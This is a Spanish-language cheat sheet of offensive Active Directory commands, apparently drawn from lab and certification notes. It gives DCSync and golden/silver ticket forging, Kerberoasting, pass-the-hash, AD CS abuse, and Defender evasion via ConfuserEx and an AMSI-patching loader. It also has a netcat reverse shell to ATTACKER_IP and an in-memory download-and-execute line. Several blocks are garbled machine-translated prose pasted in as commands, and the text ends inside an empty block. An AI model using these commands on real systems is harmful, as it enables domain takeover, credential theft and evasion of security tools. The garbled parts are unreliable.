#### Leer la contraseña de una cuenta de servicio administrada por grupo
```bash
ReadGMSAPassword
```

#### Leer la contraseña de una cuenta de servicio administrada por grupo
```bash
GMSAPasswordReader
```

#### Convertir nombre de usuario a SID
```bash
Convert-NameToSid wley
```

#### Obtener información de un usuario de Active Directory
```bash
Get-ADUser
```

#### Convertir nombre de usuario a SID
```bash
Convert-NameToSid damundsen
```

#### Extraer solo datos para un usuario específico utilizando secretsdump.py
```bash
secretsdump.py -just-dc-user <USERNAME>
```

#### Obtener el hash NT de la cuenta KRBTGT mediante Mimikatz
```bash
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL'
```

#### Crear un ticket dorado con Mimikatz
```bash
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /pttUser      : hacker
```

#### Crear un ticket dorado usando Rubeus
```bash
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

#### Obtener el hash NT de la cuenta KRBTGT mediante Mimikatz
```bash
lsadump::dcsync /user:LOGISTICS\krbtgt[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL'
```

#### Especificar el usuario a utilizar en PingCastle
```bash
PingCastle.exe --user <user>
```

#### 🩸
```bash
-u, --username    # Usuario para autenticación
```

#### 🩸
```bash
-p, --password    # Contraseña del usuario
```

#### Gestiona usuarios no privilegiados
```bash
Operadores de cuentas
```

#### 🎯
```bash
mimikatz # lsadump::dcsync /domain:domain.com /user:administrator
```

#### 🎯
```bash
mimikatz # kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /ptt
```

#### 🟦
```bash
queryuser 0x3e9
```

#### 🔐
```bash
kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-111-222-333 /krbtgt:NTLMHASH /ptt
```

#### 🔐
```bash
kerberos::golden /user:svc /domain:example.com /sid:S-1-5-21-111-222-333 /service:cifs /target:host.example.com /rc4:NTLMHASH /ptt
```

#### 🔐
```bash
/rc4:NTLMHASH /user:admin /service:krbtgt /ptt
```

#### 🔐
```bash
lsadump::setntlm /user:targetUser /ntlm:newHash
```

#### 🔐
```bash
lsadump::dcsync /user:Administrator /domain:example.com
```

#### 🔐
```bash
sid::add /user:targetUser /sid:newSid
```

#### 🧱 Crear SPN falso para Kerberoasting
```bash
PS C:\DotNetNuke\Portals\0> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```

#### 🎯 Kerberoasting dirigido
```bash
proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons>
```

#### 🤖 Generación automática — Username Anarchy
```bash
./username-anarchy -i names.txt
```

#### 🧪 Enumeración de usuarios AD con Kerbrute
```bash
[+] VALID USERNAME: bwilliamson@inlanefreight.local
```

#### 👥 Comprobación de privilegios
```bash
net user bwilliamson
```

#### Command execution
```bash
secretsdump.py DOMAIN/USER:PASS@DC_IP
```

#### Command execution
```bash
GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC_IP
```

#### Command execution
```bash
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -no-pass
```

#### Enumerar contextos de Active Directory
```bash
ldapsearch -x -H ldap://<IP> -s base namingcontexts
```

#### Concede a JDGODD derechos de propietario sobre el grupo Core Staff
```bash
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\\JDGODD"
```

#### Sube Powermad para crear cuentas de máquina falsas
```bash
upload Powermad.ps1
```

#### Genera hash RC4 de la cuenta máquina para Rubeus
```bash
.\Rubeus.exe hash /password:Password123! /user:NameFakeComputer /domain:support.htb
```

#### Convierte la contraseña en texto claro a objeto SecureString para usarla en Set-DomainUserPassword
```bash
$cred = ConvertTo-SecureString "paco100." -AsPlainText -Force
```

#### Crea credenciales de PowerShell para el usuario 'acute\imonks' con la contraseña almacenada
```bash
$cred = New-Object System.Management.Automation.PSCredential('acute\imonks', $passwd)
```

#### carga el modulo para ejecutar comandos como otro usuario sin WINRM
```bash
import-module ./Invoke-RunasCs.ps1
```

#### ejecuta whoami con credenciales de svc_mssql sin necesidad de WINRM
```bash
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
```

#### Autentica usuario contra Kerberos previo a conexión SSH
```bash
kinit name.user
```

#### Crea archivo .k5login para permitir acceso SSH sin contraseña con Kerberos
```bash
echo 'miuser@domain.htb' > .k5login
```

#### Solicita TGS de servicios vulnerables al Kerberoasting para hacer cracking offline
```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k -debug
```

#### Obtiene TGT de usuarios sin pre-autenticación (ASREProast)
```bash
impacket-GetNPUsers scrm.local/ -no-pass -usersfile users.txt
```

#### Crea Silver Ticket para el servicio MSSQL del Administrator
```bash
impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -nthash b999a16500b87d17ec7f2e2a68778f05 -dc-ip dc1.scrm.local -domain scrm.local Administrator
```

#### Ejecutar comandos remotos con autenticación pass-the-hash
```bash
impacket-vmiexec domain.htb/user@10.10.11.129
```

#### Command execution
```bash
impacket/GetUserSPNs.py de PR #1413:
```

#### Command execution
```bash
Volveremos a usar red.exe para enumerar los miembros del grupo, esta vez centrándose en el Departamento de Ventas grupo.
```

#### Command execution
```bash
Aunque esto no parece revelar mucho, cada pequeña pieza de la información obtenida a través de la enumeración es potencialmente valiosa. En una evaluación del mundo real, podríamos enumerar cada grupo, catalogando los resultados. Esto requerirá una buena organización, que discutiremos más tarde, pero seguiremos adelante por ahora ya que tenemos alternativas más flexibles a net.exe para discutir en la siguiente sección.
```

#### Command execution
```bash
En este punto, estamos obteniendo dinámicamente el Nombre de host y el DN con nuestro guión. Ahora debemos ensamblar las piezas para construir el máximo Ruta LDAP. Para hacer esto, agregaremos un nuevo $LDAP variable a nuestro script eso contendrá el $PDC y $DN variables, prefijadas con "LDAP://".
```

#### Command execution
```bash
Como se indica en el Listado 18, tenemos añadido el $desesperanza variable, que está encapsulando nuestro obtenido Ruta LDAP. El $dirsearcher la variable contiene el $desesperanza variable y utiliza la información como el SearchRoot, señalando a la parte superior de la jerarquía donde DirectorioSearcher correrá el BuscarTodos() método.
```

#### Command execution
```bash
Podemos filtrar en función de cualquier propiedad de cualquier tipo de objeto. En el ejemplo a continuación, hemos hecho dos cambios. Primero, hemos cambiado el filtro para usar el nombre propiedad para mostrar solo información para jeffadmin. Además, hemos añadido .miembro de a la $prop variable a solo muestra los grupos jeffadmin es miembro de:
```

#### Command execution
```bash
En la parte superior, declaramos la función en sí con el nombre de nuestra elección, en este caso LDAPSearch. Entonces dinámicamente obtiene la cadena de conexión de ruta LDAP requerida y la agrega a la $DirectoryEntry variable.
```

#### Command execution
```bash
Después, el DirectorioEntrada y nuestro $LDAPQuery parámetro se alimenta en el DirectorioSearcher. Finalmente, se ejecuta la búsqueda, y la salida se agrega a una matriz, que se muestra en nuestro terminal dependiendo de nuestras necesidades.
```

#### Command execution
```bash
A pesar de que este entorno es algo pequeño, todavía recibimos un mucha producción. Centrémonos en los tres grupos que notamos anteriormente nuestra enumeración con net.exe:
```

#### Command execution
```bash
El Departamento de Desarrollo es de hecho un miembro de la Ventas Departamento grupo como se indica en el Listado 33. Esto es algo que nos perdimos antes con net.exe.
```

#### Command execution
```bash
Esto concluye el viaje con nuestro script de PowerShell que invoca .Clases NET para ejecutar consultas contra AD a través de LDAP. Como tenemos verificado, este enfoque es mucho más poderoso que ejecutar herramientas como como net.exe y proporciona una gran cantidad de opciones de enumeración.
```

#### Command execution
```bash
Ahora podemos correr sekurlsa::contraseñas de inicio de sesión volcar las credenciales de todos los usuarios conectados con el Sekurlsa módulo.
```

#### Command execution
```bash
| Ataque a la autenticación de Active Directory - AS-REP Roasting - Grupo de máquinas virtuales 1 |  |  |
```

#### Command execution
```bash
| Ataque a la autenticación de Active Directory - AS-REP Roasting - Grupo de máquinas virtuales 2 |  |  |
```

#### Command execution
```bash
La utilidad winrs se puede invocar especificando el host de destino a través de el argumento -r: y el nombre de usuario con -u: y la contraseña con -p. Como argumento final, queremos especificar los comandos que se ejecutarán en el host remoto. Por ejemplo, queremos ejecutar el nombre de host y whoami para demostrar que se están ejecutando en el destino remoto.
```

#### Command execution
```bash
Es posible hacer un mal uso de esta herramienta para el movimiento lateral, pero tres deben cumplirse los requisitos. En primer lugar, el usuario que se autentica en el archivo El equipo de destino debe formar parte del grupo local de administradores. En segundo lugar, el recurso compartido ADMIN$ debe estar disponible y, en tercer lugar, File y El uso compartido de la impresora debe estar activado. Por suerte para nosotros, los dos últimos ya se cumplen los requisitos, ya que son la configuración predeterminada en sistemas modernos de servidores Windows.
```

#### Command execution
```bash
A pesar de que PsExec no está instalado de forma predeterminada en Windows, puede transferirlo fácilmente a nuestra máquina comprometida. Por el bien de usabilidad, toda la suite SysInternals está disponible en CLIENT74. Una vez Iniciado sesión como usuario de Offsec en CLIENT74, podemos ejecutar el archivo de 64 bits versión de PsExec de C:\Tools\SysinternalsSuite.
```

#### Command execution
```bash
Como primer argumento, especificamos /user: y /domain:, estableciéndolos en jen y corp.com respectivamente. Especificaremos el hash NTLM con /ntlm: y Por último, utilice /run: para especificar el proceso que se va a crear (en este caso, PowerShell).
```

#### Command execution
```bash
| Movimiento lateral en Active Directory: superación del hash: grupo de máquina virtual 1 |  |  |
```

#### Command execution
```bash
| Movimiento lateral en Active Directory: superar el hash: grupo de máquinas virtuales 2 |  |  |
```

#### Command execution
```bash
| Movimiento lateral en Active Directory - Pasar el ticket - Grupo de VM 1 |  |  |
```

#### Command execution
```bash
Volvamos a CLIENT74 como el jen usuario. Antes de generar el golden ticket lancemos mimikatz y eliminemos cualquier Kerberos existente entradas con kerberos::purgar.
```

#### Command execution
```bash
Invoke-Whisker -Command "add /target:USER"
```

#### Command execution
```bash
secretsdump.py <domain>/<user>@<DC_IP> -hashes :<NTLMhash>
```

#### Command execution
```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10
```

#### Command execution
```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request
```

#### Command execution
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
```

#### Command execution
```bash
python3 certipy-ad find -u user@domain.local -p 'Password123' -dc-ip DC_IP -vulnerable
```

#### Command execution
```bash
certipy-ad req -u user@domain.local -p 'Password123' -ca 'CA-Name' -template 'VulnerableTemplate' -upn administrator@domain.local -dc-ip DC_IP
```

#### Command execution
```bash
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:"" /ptt
```

#### Command execution
```bash
certipy-ad template -u user@domain.local -p 'Password123' -template 'TargetTemplate' -save-old
```

#### Command execution
```bash
certipy-ad req -u user@domain.local -p 'Password123' -ca 'CA-Name' -template 'TargetTemplate' -upn administrator@domain.local
```

#### Command execution
```bash
certipy-ad template -u user@domain.local -p 'Password123' -template 'TargetTemplate' -configuration TargetTemplate.json
```

#### Command execution
```bash
Rubeus.exe monitor /interval:5 /filteruser:Administrator
```

#### Command execution
```bash
Rubeus.exe s4u /ticket:BASE64_TGT /impersonateuser:Administrator /msdsspn:cifs/TARGET_SERVER.domain.local /ptt
```

#### Command execution
```bash
python3 addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'Password123' domain.local/user:pass -dc-ip DC_IP
```

#### Command execution
```bash
python3 secretsdump.py domain/user:pass@DC_IP
```

#### Command execution
```bash
python3 secretsdump.py -just-dc-user Administrator domain/user:pass@DC_IP
```

#### Command execution
```bash
| lsadump::dcsync /user:domain\krbtgt | DCSync: extract krbtgt hash | | lsadump::dcsync /user:domain\Administrator | DCSync: extract admin hash | | sekurlsa::tickets /export | Export all Kerberos tickets | | sekurlsa::ekeys | Dump encryption keys | | token::elevate then lsadump::secrets | Dump LSA secrets | # Pass-the-Hash | Command | Description | | psexec.py domain/user@IP -hashes :NTLM_HASH | PtH via psexec (Impacket) | | wmiexec.py domain/user@IP -hashes :NTLM_HASH | PtH via WMI (Impacket) | | evil-winrm -i IP -u user -H NTLM_HASH | PtH via WinRM | | smbexec.py domain/user@IP -hashes :NTLM_HASH | PtH via SMB (Impacket) | | crackmapexec smb IP -u user -H NTLM_HASH -x 'whoami' | PtH command execution via CME | # Pass-the-Ticket | Command | Description | | Rubeus.exe ptt /ticket:ticket.kirbi | Import ticket into session | | ticketConverter.py ticket.kirbi ticket.ccache | Convert kirbi to ccache | | export KRB5CCNAME=ticket.ccache | Set ccache for Linux tools | | psexec.py domain/user@target -k -no-pass | Use ticket with Impacket | # Golden Ticket | Command | Description | | kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt | Mimikatz: create and inject golden ticket | | ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator | Impacket: create golden ticket | | export KRB5CCNAME=Administrator.ccache | Use golden ticket on Linux | # Silver Ticket | Command | Description | | kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt | Mimikatz: create silver ticket for CIFS | | ticketer.py -nthash SVC_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/server.domain.local Administrator | Impacket: create silver ticket | # DCSync & Credential Dumping | Command | Description | | secretsdump.py domain/user:pass@DC_IP | Dump all hashes via DCSync | | secretsdump.py domain/user@DC_IP -hashes :NTLM_HASH | DCSync with PtH | | crackmapexec smb DC_IP -u user -p pass --sam | Dump SAM via CME | | crackmapexec smb DC_IP -u user -p pass --lsa | Dump LSA secrets via CME | | crackmapexec smb DC_IP -u user -p pass --ntds | Dump NTDS.dit via CME | | crackmapexec smb DC_IP -u user -p pass -x 'whoami /all' | Remote command execution via CME | # Rubeus Advanced | Command | Description | | Rubeus.exe s4u /user:svc$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target /ptt | S4U constrained delegation abuse | | Rubeus.exe monitor /interval:5 /nowrap | Monitor for new TGTs | | Rubeus.exe harvest /interval:30 | Harvest TGTs periodically | | Rubeus.exe tgtdeleg /nowrap | Extract usable TGT from current session | | Rubeus.exe renew /ticket:ticket.kirbi /ptt | Renew and inject ticket | | Rubeus.exe dump /nowrap | Dump all Kerberos tickets |
```

#### Windows Backdoors & Persistence CheatSheet (Formato C): Ejecuta un proceso con otro usuario o con credenciales almacenadas.
```bash
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```

#### Rsync sobre SSH
```bash
rsync -av -e ssh usuario@host:/ruta .
```

#### Conectarse sin creds
```bash
rlogin 10.0.17.2 -l usuario
```

#### Enumerar usuarios activos
```bash
rusers -al 10.0.17.5
```

#### Carpeta de inicio del usuario actual
```bash
\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

#### Carpeta de inicio común (todos los usuarios)
```bash
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

#### Lista computadoras con delegacion Kerberos sin restricciones (Unconstrained Delegation). Estas maquinas almacenan TGTs de usuarios que se conectan a ellas.
```bash
Get-DomainComputer -Unconstrained | select dnshostname
```

#### Obtiene estadisticas de Kerberoast: numero de usuarios con SPN, tipo de cifrado de cada uno. Planificacion previa al ataque.
```bash
Rubeus.exe kerberoast /stats
```

#### Enumerar SPNs con PowerView. Lista usuarios vulnerables a Kerberoasting.
```bash
Get-DomainUser -SPN | select serviceprincipalname
```

#### Extrae hashes NTLM de la base SAM local. Equivalente a hashdump pero con Mimikatz. Obtiene hashes de todas las cuentas locales del sistema.
```bash
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

#### Pass-the-Ticket: inyecta un ticket Kerberos (TGT o TGS) en la sesion actual. Permite acceder a recursos como si fuera el usuario propietario del ticket.
```bash
Rubeus.exe ptt /ticket:<base64_ticket>
```

#### Crea un Silver Ticket: TGS falso para un servicio especifico. No requiere el hash de krbtgt, solo el hash de la cuenta del servicio. Mas sigiloso que Golden Ticket.
```bash
mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local /sid:<DOMAIN_SID> /target:<SERVER> /service:cifs /rc4:<SERVICE_HASH> /ptt"
```

#### Ataque S4U (Constrained Delegation): impersona a un usuario administrador contra un servicio especifico. Abusa de la delegacion restringida de Kerberos.
```bash
Rubeus.exe s4u /user:<CUENTA_MAQUINA> /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/<TARGET> /ptt
```

#### Monitorea nuevos tickets TGT que aparecen en la maquina cada 5 segundos. Util en maquinas con Unconstrained Delegation para capturar TGTs de usuarios que se conectan.
```bash
Rubeus.exe monitor /interval:5 /nowrap
```

#### Filtra solo plantillas vulnerables. Más rápido para identificar ESC1-ESC13 directamente.
```bash
certipy find -u user@domain.local -p 'Password' -dc-ip DC_IP -vulnerable
```

#### ESC1: solicita certificado con UPN alternativo (administrator). Si la plantilla permite especificar SAN, se obtiene certificado de admin.
```bash
certipy req -u user@domain.local -p 'Password' -ca CA_NAME -template VulnerableTemplate -upn administrator@domain.local
```

#### Netexec: módulo automático que busca y descifra GPP passwords en SYSVOL.
```bash
netexec smb DC_IP -u user -p password -M gpp_password
```

#### Busca contraseñas de autologin en Registry.xml del SYSVOL (otra fuente común de credenciales en GPO).
```bash
netexec smb DC_IP -u user -p password -M gpp_autologin
```

#### Query/index mechanism: ejemplo de busqueda LDAP. AD no es solo usuarios: es una base jerarquica consultable por filtros y atributos.
```bash
Get-ADObject -LDAPFilter '(objectClass=user)' -SearchBase (Get-ADDomain).DistinguishedName -ResultSetSize 5 -Properties *
```

#### Replication Service: resumen de replicacion entre DCs. En AD, un cambio de ACL, grupo o password no siempre se ve igual en todos los DCs al instante.
```bash
repadmin /replsummary
```

#### Mira ejemplos de un cmdlet. En CRTP, entender parametros suele ahorrar mas tiempo que copiar comandos.
```bash
Get-Help Get-ADUser -Examples
```

#### Abre ConfuserEx GUI desde la carpeta de herramientas del lab. ConfuserEx trabaja sobre binarios .NET compilados.
```bash
Start-Process C:\AD\Tools\ConfuserEx\ConfuserEx.exe
```

#### Paso manual de GUI: crea una regla y ajusta preset a Maximum, tal como muestra el material CRTP. Documentalo porque puede romper depuracion o funcionalidad.
```bash
Add rule in ConfuserEx Settings -> Preset: Maximum
```

#### Paso manual de GUI: en la pestana Protect, genera el binario ofuscado. Despues comprueba ejecucion y deteccion.
```bash
ConfuserEx Protect -> Protect
```

#### Verifica el resultado con DefenderCheck en el laboratorio. Si una tecnica rompe el binario, vuelve a un preset menor o revisa reglas.
```bash
DefenderCheck.exe C:\AD\Tools\Rubeus-master\Rubeus\bin\Release\Confused\Rubeus.exe
```

#### NetLoader como delivery de binarios .NET en el lab: carga desde URL o ruta y puede parchear AMSI/ETW durante la ejecucion. Usalo como concepto CRTP autorizado: delivery, logging y deteccion importan tanto como el binario.
```bash
C:\Users\Public\Loader.exe -path http://172.16.100.X/SafetyKatz.exe
```

#### Carga desde filepath local. Diferencia mental: URL introduce red/delivery; filepath reduce red pero sigue generando proceso/telemetria.
```bash
C:\Users\Public\Loader.exe -path C:\AD\Tools\SafetyKatz.exe
```

#### Documenta hashes de loader y payload antes de pruebas. En CRTP ayuda a comparar versiones ofuscadas con Codecepticon/ConfuserEx.
```bash
Get-FileHash C:\Users\Public\Loader.exe; Get-FileHash C:\AD\Tools\SafetyKatz.exe
```

#### Verifica el loader ofuscado en el laboratorio. Si detecta, vuelve al ciclo: medir -> localizar -> modificar/ofuscar -> recompilar -> verificar.
```bash
DefenderCheck.exe C:\Users\Public\Loader.exe
```

#### Punto de partida Assume Breach: ya estas dentro. Primero identifica usuario, grupos, privilegios, integridad y SID antes de enumerar.
```bash
whoami /all
```

#### PowerView: busca cadena en atributos de usuario. Las descripciones pueden contener pistas, roles o malas practicas.
```bash
Get-DomainUser -LDAPFilter 'Description=*built*' | Select-Object name,Description
```

#### ADModule: busqueda equivalente por Description. Buen ejemplo para aprender sintaxis PowerView vs ADModule.
```bash
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | Select-Object name,Description
```

#### Usando PowerView - Enumerate user. Enumeracion PowerView de usuarios o atributos de usuario.
```bash
Get-DomainUser
```

#### DACL: lista de ACEs. Cada ACE dice trustee, allow/deny, derecho y herencia. Las ACE deny tienen precedencia en el modelo de acceso.
```bash
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
```

#### PowerView: ACLs desde un SearchBase concreto. Util para el objetivo de enumerar ACL del grupo Domain Admins.
```bash
Get-DomainObjectAcl -SearchBase 'LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDS -Verbose
```

#### Alternativa por WMI cuando RPC/SMB usados por Find-LocalAdminAccess estan bloqueados. Requiere el script correspondiente del lab.
```bash
Find-WMILocalAdminAccess.ps1
```

#### Alternativa por PowerShell Remoting para identificar local admin. Util si WinRM esta habilitado.
```bash
Find-PSRemotingLocalAdminAccess.ps1
```

#### Modo mas contenido: orientado a file servers/distributed file servers. Menos cobertura, menos ruido.
```bash
Find-DomainUserLocation -Stealth
```

#### SessionHunter lista sesiones en maquinas remotas usando Remote Registry/HKEY_USERS y no requiere admin remoto en todos los casos.
```bash
Invoke-SessionHunter -FailSafe
```

#### PowerUp: servicios donde el usuario puede escribir el binario o cambiar argumentos.
```bash
Get-ModifiableServiceFile -Verbose
```

#### PowerUp: servicios cuya configuracion puede modificar el usuario actual.
```bash
Get-ModifiableService -Verbose
```

#### Primer comando seguro de validacion en Jenkins: identifica usuario de ejecucion y host antes de intentar cualquier accion de escalada.
```bash
whoami && hostname
```

#### Concepto: en relay no capturas la password; reenvias autenticacion a otro servicio. LDAP y AD CS son objetivos comunes en AD.
```bash
ntlmrelayx.py --help
```

#### Enumera servicios AD CS desde AD. Antes de hablar de relay a AD CS, confirma si existe CA Enterprise.
```bash
Get-ADObject -LDAPFilter '(objectClass=pKIEnrollmentService)' -SearchBase (Get-ADRootDSE).ConfigurationNamingContext
```

#### Local Privilege Escalation - PowerUp. Abusa un servicio modificable para elevar privilegios locales en el lab.
```bash
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student701' -Verbose
```

#### Hunt for Local Admin access. Encuentra equipos donde el usuario tiene admin local via PSRemoting.
```bash
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

#### Hunt for Local Admin access. Encuentra equipos donde el usuario tiene admin local via PSRemoting.
```bash
Find-PSRemotingLocalAdminAccess
```

#### Hunt for Local Admin access
```bash
set username
```

#### GPO abuse for admin access on `dcorp-ci` - Use WSLToTh3Rescue! as the sudo password
```bash
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.1 --http-port '80,8080' -i --no-smb-server
```

#### GPO abuse for admin access on `dcorp-ci` - Connect to the ldap shell started on port 11000
```bash
nc 127.0.0.1 11000
```

#### GPO abuse for admin access on `dcorp-ci` - Provide the studentx user WriteDACL permissions over Devops Policy
```bash
write_gpo_dacl student701 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

#### Runas con credenciales elevadas - Start a cmd process using runas
```bash
runas /user:dcorp\srvadmin /netonly cmd
```

#### Runas con credenciales elevadas - In a new process. Encuentra equipos donde el usuario tiene admin local via PSRemoting.
```bash
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
```

#### Runas con credenciales elevadas - Copy the Loader.exe to dcorp-mgmt
```bash
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

#### Runas con credenciales elevadas - Copy the Loader.exe to dcorp-mgmt. Ejecuta SafetyKatz para extraer secretos o hacer DCSync segun contexto.
```bash
winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::evasive-keys" "exit"
```

#### Disable AppLocker by modifying GPO
```bash
runas /user:dcorp\student481 /netonly cmd
```

#### Disable AppLocker by modifying GPO - Copy Loader on the machine and use it to run SafetyKatz
```bash
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
```

#### Disable AppLocker by modifying GPO - Copy Loader on the machine and use it to run SafetyKatz. Ejecuta SafetyKatz para extraer secretos o hacer DCSync segun contexto.
```bash
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

#### OPTH con SafetyKatz/Mimikatz: genera token/logon type 9 desde hash/clave. Requiere elevacion.
```bash
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe" "exit"
```

#### Rubeus OPTH sin elevacion para RC4/NTLM en ciertos escenarios: pide TGT e inyecta ticket.
```bash
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```

#### Rubeus con AES, /opsec y createnetonly. La variante con createnetonly necesita elevacion.
```bash
Rubeus.exe asktgt /user:administrator /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

#### Impacket DCSync desde Linux. Mismo concepto: replicacion MS-DRSR, no dump local del DC.
```bash
secretsdump.py dollarcorp.moneycorp.local/user:pass@dcorp-dc.dollarcorp.moneycorp.local -just-dc-user krbtgt
```

#### Enumeracion usando PowerView desde `dcorp-ci` - Download and execute PowerView in memory and run Find-DomainUserLocation
```bash
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.81/PowerView.ps1')
```

#### Enumeracion usando PowerView desde `dcorp-ci` - Download and execute PowerView in memory and run Find-DomainUserLocation
```bash
Find-DomainUserLocation
```

#### Enumeracion usando PowerView desde `dcorp-ci` - Domain admin session on dcorp-mgmt server
```bash
winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```

#### Ejecutar SafetyKatz en `dcorp-mgmt` - Copy Loader.exe to dcorp-mgmt
```bash
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

#### Ejecutar SafetyKatz en `dcorp-mgmt` - Copy Loader.exe to dcorp-mgmt. Ejecuta SafetyKatz para extraer secretos o hacer DCSync segun contexto.
```bash
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

#### OverPass-the-Hash con credenciales de `svcadmin`. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

#### krbtgt firma TGTs. PasswordLastSet y KVNO son claves para entender rotacion y tickets forjados.
```bash
Get-ADUser krbtgt -Properties PasswordLastSet,msDS-KeyVersionNumber
```

#### Rubeus genera comando de Golden Ticket con atributos parecidos a un TGT normal. /ldap hace consultas para recuperar flags/grupos/netbios; si ya tienes datos, especificarlos manualmente reduce consultas.
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /sid:<domain_sid> /ldap /user:Administrator /printcmd
```

#### Targeted Kerberoasting con GenericWrite/GenericAll sobre usuario: anades un SPN temporal, pides TGS, crackeas offline y luego limpias el atributo.
```bash
Set-DomainObject -Identity victim -Set @{serviceprincipalname='http/owned'}
```

#### Usuario para el que se genera el TGT. No tiene que existir igual si el ticket esta forjado, pero conviene que el perfil sea creible.
```bash
/user:Administrator
```

#### Extraer hashes del Domain Controller - In the new process
```bash
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

#### Extraer hashes del Domain Controller - Make sure SafetyKatz is hosted in HFS server. Ejecuta SafetyKatz para extraer secretos o hacer DCSync segun contexto.
```bash
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
```

#### Obtener AES keys. Ejecuta SafetyKatz para extraer secretos o hacer DCSync segun contexto.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

#### Forging Golden Ticket usando Rubeus - On a new CMD session. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbc5ba8c3dca848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

#### Forja TGS para un SPN concreto. Funciona porque el servicio valida el TGS con su propia clave, no con krbtgt.
```bash
Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:<service_or_machine_hash> /sid:<domain_sid> /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

#### HTTP Service - Do not use krbtgt hash here; aes256 keys can also be used instead of NTLM hash. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
